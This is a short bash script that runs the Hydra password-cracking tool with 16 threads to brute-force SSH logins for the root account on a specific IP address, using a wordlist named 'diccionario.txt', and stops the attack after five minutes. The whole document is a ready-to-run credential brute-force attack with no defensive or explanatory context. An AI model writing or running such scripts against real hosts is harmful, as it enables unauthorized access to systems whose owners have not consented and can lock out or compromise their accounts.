#!/bin/bash
rm hydra.restore
hydra -t 16 -l root -P diccionario.txt 157.88.123.102 ssh& 
sleep 300
pkill hydra 